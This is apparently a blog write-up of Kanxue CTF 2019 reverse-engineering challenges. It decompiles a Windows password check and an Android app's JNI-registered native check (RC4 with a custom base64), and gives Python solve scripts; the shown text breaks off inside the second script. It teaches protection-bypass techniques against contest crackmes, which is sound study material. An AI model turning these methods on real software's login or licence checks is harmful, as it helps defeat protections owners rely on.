{"title":"看雪ctf第一赛季部分题目writeup","date":"2019-03-25T07:25:07.000Z","slug":"看雪ctf第一赛季部分题目writeup","updated":"2019-03-25T07:29:34.517Z","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>最近把论文整的差不多了，刚好有个看雪的比赛就玩一会儿，不得不说题目还是很有趣的，做了一部分，肝不动了= =</p>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><p>把文件拖入IDA进行分析，发现checkpasswd的函数如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">check_passwd</span><span class=\"params\">(<span class=\"keyword\">int</span> password_array)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> Str1[<span class=\"number\">28</span>]; <span class=\"comment\">// [esp+D8h] [ebp-24h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [esp+F4h] [ebp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [esp+F8h] [ebp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( *(_DWORD *)(password_array + <span class=\"number\">4</span> * v4) &lt; <span class=\"number\">62</span> &amp;&amp; *(_DWORD *)(password_array + <span class=\"number\">4</span> * v4) &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    Str1[v4] = aAbcdefghiabcde[*(_DWORD *)(password_array + <span class=\"number\">4</span> * v4)];</span><br><span class=\"line\">    ++v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Str1[v4] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(Str1, <span class=\"string\">\"KanXueCTF2019JustForhappy\"</span>) )</span><br><span class=\"line\">    result = sub_401770();</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = sub_4017B0();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看出这里面有个置换的过程，其中置换的数组为：abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ。<br>可以写出如下solve:<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1 = <span class=\"string\">\"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ\"</span></span><br><span class=\"line\">str2 = <span class=\"string\">\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span></span><br><span class=\"line\">str3 = <span class=\"string\">\"KanXueCTF2019JustForhappy\"</span></span><br><span class=\"line\">kk = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> kk <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,len(str3)):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> str2:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ch &lt;= <span class=\"string\">'9'</span> <span class=\"keyword\">and</span> ch &gt;=<span class=\"string\">'0'</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> str3[kk] == str1[ord(ch)<span class=\"number\">-48</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">print</span> ch,</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ch &lt;= <span class=\"string\">'Z'</span> <span class=\"keyword\">and</span> ch &gt;=<span class=\"string\">'A'</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> str3[kk] == str1[ord(ch)<span class=\"number\">-29</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">print</span> ch,</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ch &lt;= <span class=\"string\">'z'</span> <span class=\"keyword\">and</span> ch &gt;=<span class=\"string\">'a'</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> str3[kk] == str1[ord(ch)<span class=\"number\">-87</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">print</span> ch,</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><p>这道题目是一个安卓的题，主要是一个登陆界面，拖入jeb首先看前端。找到MainActivity如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompiatActivity</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyHandler</span> <span class=\"keyword\">extends</span> <span class=\"title\">Handler</span> </span>&#123;</span><br><span class=\"line\">        WeakReference mWeakReference;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MyHandler</span><span class=\"params\">(MainActivity arg2)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">super</span>();</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.mWeakReference = <span class=\"keyword\">new</span> WeakReference(arg2);</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure></p>\n<p>这有一个fake，MainActivity继承的是自定义的AppCompiatActivity，并不是AppCompatActivity，打开该类看一看。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AppCompiatActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> MSG_LOGIN;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Handler handler;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Button login;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String mName;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String mPassword;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> EditText name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> EditText password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        System.loadLibrary(<span class=\"string\">\"oo000oo\"</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以发现这其实是真实的破解代码索要研究的内容。继续观察如下代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">native</span> <span class=\"keyword\">boolean</span> <span class=\"title\">eq</span><span class=\"params\">(String arg1)</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onStart</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>.onStart();</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.login = <span class=\"keyword\">this</span>.findViewById(<span class=\"number\">2131165260</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.login.setOnClickListener(<span class=\"keyword\">new</span> View$OnClickListener() &#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View arg5)</span> </span>&#123;</span><br><span class=\"line\">            AppCompiatActivity.<span class=\"keyword\">this</span>.mName = AppCompiatActivity.<span class=\"keyword\">this</span>.name.getText().toString();</span><br><span class=\"line\">            AppCompiatActivity.<span class=\"keyword\">this</span>.mPassword = AppCompiatActivity.<span class=\"keyword\">this</span>.password.getText().toString();</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!TextUtils.isEmpty(AppCompiatActivity.<span class=\"keyword\">this</span>.mName)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(TextUtils.isEmpty(AppCompiatActivity.<span class=\"keyword\">this</span>.mPassword)) &#123;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">int</span> v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">                    AppCompiatActivity.<span class=\"keyword\">this</span>.login.setEnabled(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(AppCompiatActivity.<span class=\"keyword\">this</span>.eq(AppCompiatActivity.<span class=\"keyword\">this</span>.mPassword)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">byte</span>[] v5 = AppCompiatActivity.<span class=\"keyword\">this</span>.mPassword.getBytes();</span><br><span class=\"line\">                        <span class=\"keyword\">int</span> v3 = <span class=\"number\">24</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(v5.length != v3) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">byte</span>[] v2 = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[v3];</span><br><span class=\"line\">                            <span class=\"keyword\">while</span>(v1 &lt; v2.length) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">byte</span> v3_1 = v1 &lt; v5.length ? v5[v1] : ((<span class=\"keyword\">byte</span>)v1);</span><br><span class=\"line\">                                v2[v1] = v3_1;</span><br><span class=\"line\">                                ++v1;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                            v5 = v2;</span><br><span class=\"line\">                        &#125;</span><br></pre></td></tr></table></figure></p>\n<p>发现登陆时候使用了eq这个函数进行判断，eq改函数是前面的System.loadLibrary(“oo000oo”)中的，所以打开ida，对该so文件进行分析。<br>发现so文件中并没有eq该函数，所以判断在JNI_LOAD或者在init_array里面做了手脚。<br>JNI_LOAD函数如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> __<span class=\"function\">fastcall <span class=\"title\">JNI_OnLoad</span><span class=\"params\">(JNIEnv *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// r8</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> result; <span class=\"comment\">// r0</span></span><br><span class=\"line\">  JNIEnv *v3; <span class=\"comment\">// r5</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// r6</span></span><br><span class=\"line\">  JNIEnv *v5; <span class=\"comment\">// [sp+0h] [bp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v6; <span class=\"comment\">// [sp+4h] [bp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v7; <span class=\"comment\">// [sp+8h] [bp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = v1;</span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !((<span class=\"keyword\">int</span> (*)(<span class=\"keyword\">void</span>))(*a1)-&gt;FindClass)() )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_4;</span><br><span class=\"line\">LABEL_2:</span><br><span class=\"line\">  result = <span class=\"number\">-1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( _stack_chk_guard != v6 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_4:</span><br><span class=\"line\">    v3 = v5;</span><br><span class=\"line\">    v4 = ((<span class=\"keyword\">int</span> (__fastcall *)(JNIEnv *, <span class=\"keyword\">void</span> *))(*v5)-&gt;FindClass)(v5, off_CADFB010);</span><br><span class=\"line\">    dword_CADFB110 = ((<span class=\"keyword\">int</span> (__fastcall *)(JNIEnv *, <span class=\"keyword\">int</span>))(*v3)-&gt;NewGlobalRef)(v3, v4);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v4</span><br><span class=\"line\">      || ((<span class=\"keyword\">int</span> (__fastcall *)(JNIEnv *, <span class=\"keyword\">int</span>, <span class=\"keyword\">char</span> **, <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>))(*v3)-&gt;RegisterNatives)(v3, v4, off_CADFB014, <span class=\"number\">1</span>) &lt;= <span class=\"number\">-1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    result = <span class=\"number\">0x10006</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>init_array函数执行了datadiv_decode5009363700628197108字符串解密函数，两个函数以整合，可以知道eq函数就是sub_784函数。<br>该函数是一个判断函数，主要判断逻辑为：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v28 = (v28 + <span class=\"number\">1</span>) % <span class=\"number\">256</span>;</span><br><span class=\"line\">    v35 = (<span class=\"keyword\">unsigned</span> __int8)v46[v28];</span><br><span class=\"line\">    v30 = (v30 + v35) % <span class=\"number\">256</span>;</span><br><span class=\"line\">    v46[v28] = v46[v30];</span><br><span class=\"line\">    v46[v30] = v35;</span><br><span class=\"line\">    v17 = (<span class=\"keyword\">char</span> *)(<span class=\"keyword\">unsigned</span> __int8)v46[v28];</span><br><span class=\"line\">    middle_value = v46[(<span class=\"keyword\">unsigned</span> __int8)(v35 + (_BYTE)v17)] ^ password[v29];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v29 &amp;&amp; (v27 = <span class=\"number\">0xAAAAAAAB</span> * (<span class=\"keyword\">unsigned</span> __int64)v29 &gt;&gt; <span class=\"number\">32</span>, v37 = <span class=\"number\">3</span> * (v29 / <span class=\"number\">3</span>), v37 != v29) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v31 = v29 == <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v29 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        v31 = v37 + <span class=\"number\">1</span> == v29;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v31 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v32 = <span class=\"built_in\">array</span>;</span><br><span class=\"line\">        v26[v44 + v29] = <span class=\"built_in\">array</span>[(<span class=\"keyword\">unsigned</span> __int8)v26[v44 + v29] | ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)middle_value &gt;&gt; <span class=\"number\">4</span>)];</span><br><span class=\"line\">        v17 = &amp;v26[v44 + v29];</span><br><span class=\"line\">        v27 = <span class=\"number\">4</span> * middle_value &amp; <span class=\"number\">0x3C</span>;</span><br><span class=\"line\">        v17[<span class=\"number\">1</span>] = v27;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v29 + <span class=\"number\">1</span> &gt;= v24 )</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_53;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v33 = v29 == <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v29 != <span class=\"number\">2</span> )</span><br><span class=\"line\">          v33 = v37 + <span class=\"number\">2</span> == v29;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v33 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v17 = (<span class=\"keyword\">char</span> *)(middle_value &amp; <span class=\"number\">0xC0</span>);</span><br><span class=\"line\">          v34 = v44++ + v29;</span><br><span class=\"line\">          v26[v34] = <span class=\"built_in\">array</span>[(<span class=\"keyword\">unsigned</span> __int8)v26[v34] | ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)v17 &gt;&gt; <span class=\"number\">6</span>)] ^ <span class=\"number\">0xF</span>;</span><br><span class=\"line\">          v27 = (<span class=\"keyword\">int</span>)&amp;v26[v34];</span><br><span class=\"line\">          *(_BYTE *)(v27 + <span class=\"number\">1</span>) = <span class=\"built_in\">array</span>[middle_value &amp; <span class=\"number\">0x3F</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v26[v44 + v29] = <span class=\"built_in\">array</span>[(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)middle_value &gt;&gt; <span class=\"number\">2</span>] ^ <span class=\"number\">7</span>;</span><br><span class=\"line\">      v17 = &amp;v26[v44 + v29];</span><br><span class=\"line\">      v27 = <span class=\"number\">16</span> * middle_value &amp; <span class=\"number\">0x30</span>;</span><br><span class=\"line\">      v17[<span class=\"number\">1</span>] = v27;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v29 + <span class=\"number\">1</span> &gt;= v24 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v38 = <span class=\"built_in\">array</span>[v27];</span><br><span class=\"line\">        *((_WORD *)v17 + <span class=\"number\">1</span>) = <span class=\"number\">0x3B3B</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_43;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ++v29;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v29 &lt; v24 );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>  该逻辑还是很好看懂的，可以写出如下的solve代码：<br>  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">#print hex(0x20 ^ 0x7)</span></span><br><span class=\"line\"><span class=\"comment\">#print hex(0x9b ^ 0x67)</span></span><br><span class=\"line\"><span class=\"comment\">#print hex(63&lt;&lt;2)</span></span><br><span class=\"line\"><span class=\"comment\">#print hex(0xfc^0x9b)</span></span><br><span class=\"line\"><span class=\"comment\">#print chr(0x67)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">array1 =[<span class=\"number\">0x20</span>,<span class=\"number\">0x7B</span>,<span class=\"number\">0x39</span>,<span class=\"number\">0x2A</span>,<span class=\"number\">0x38</span>,<span class=\"number\">0x67</span>,<span class=\"number\">0x61</span>,<span class=\"number\">0x2A</span>,</span><br><span class=\"line\"><span class=\"number\">0x6C</span>,<span class=\"number\">0x21</span>,<span class=\"number\">0x54</span>,<span class=\"number\">0x6E</span>,<span class=\"number\">0x3F</span>,<span class=\"number\">0x40</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x66</span>,</span><br><span class=\"line\"><span class=\"number\">0x6A</span>,<span class=\"number\">0x27</span>,<span class=\"number\">0x6A</span>,<span class=\"number\">0x24</span>,<span class=\"number\">0x5C</span>,<span class=\"number\">0x67</span>,<span class=\"number\">0x3B</span>,<span class=\"number\">0x3B</span>]</span><br><span class=\"line\"><span class=\"comment\">#0x20 0x7B 0x39 0x2A 0x38 0x67 0x61 0x2A</span></span><br><span class=\"line\"><span class=\"comment\">#0x6C 0x21 0x54 0x6E 0x3F 0x40 0x23 0x66  </span></span><br><span class=\"line\"><span class=\"comment\">#0x6A 0x27 0x6A 0x24 0x5C 0x67 0x3B 0x3B</span></span><br><span class=\"line\"></span><br><span class=\"line\">array =[<span class=\"number\">0x21</span>,<span class=\"number\">0x3A</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x24</span>,<span class=\"number\">0x25</span>,<span class=\"number\">0x26</span>,<span class=\"number\">0x28</span>,<span class=\"number\">0x29</span>,<span class=\"number\">0x2B</span>,<span class=\"number\">0x2D</span>,<span class=\"number\">0x2A</span>,<span class=\"number\">0x2F</span>,<span class=\"number\">0x60</span>,<span class=\"number\">0x7E</span>,<span class=\"number\">0x5F</span>,<span class=\"number\">0x5B</span>,</span><br><span class=\"line\"><span class=\"number\">0x5D</span>,<span class=\"number\">0x7B</span>,<span class=\"number\">0x7D</span>,<span class=\"number\">0x3F</span>,<span class=\"number\">0x3C</span>,<span class=\"number\">0x3E</span>,<span class=\"number\">0x2C</span>,<span class=\"number\">0x2E</span>,<span class=\"number\">0x40</span>,<span class=\"number\">0x5E</span>,<span class=\"number\">0x61</span>,<span class=\"number\">0x62</span>,<span class=\"number\">0x63</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0x65</span>,<span class=\"number\">0x66</span>,</span><br><span class=\"line\"><span class=\"number\">0x67</span>,<span class=\"number\">0x68</span>,<span class=\"number\">0x69</span>,<span class=\"number\">0x6A</span>,<span class=\"number\">0x6B</span>,<span class=\"number\">0x6C</span>,<span class=\"number\">0x6D</span>,<span class=\"number\">0x6E</span>,<span class=\"number\">0x6F</span>,<span class=\"number\">0x70</span>,<span class=\"number\">0x71</span>,<span class=\"number\">0x72</span>,<span class=\"number\">0x73</span>,<span class=\"number\">0x74</span>,<span class=\"number\">0x75</span>,<span class=\"number\">0x76</span>,</span><br><span class=\"line\"><span class=\"number\">0x77</span>,<span class=\"number\">0x78</span>,<span class=\"number\">0x79</span>,<span class=\"number\">0x7A</span>,<span class=\"number\">0x30</span>,<span class=\"number\">0x31</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x33</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x35</span>,<span class=\"number\">0x36</span>,<span class=\"number\">0x37</span>,<span class=\"number\">0x38</span>,<span class=\"number\">0x39</span>,<span class=\"number\">0x5C</span>,<span class=\"number\">0x27</span>,</span><br><span class=\"line\"><span class=\"number\">0x3B</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>,<span class=\"number\">0x00</span>]</span><br><span 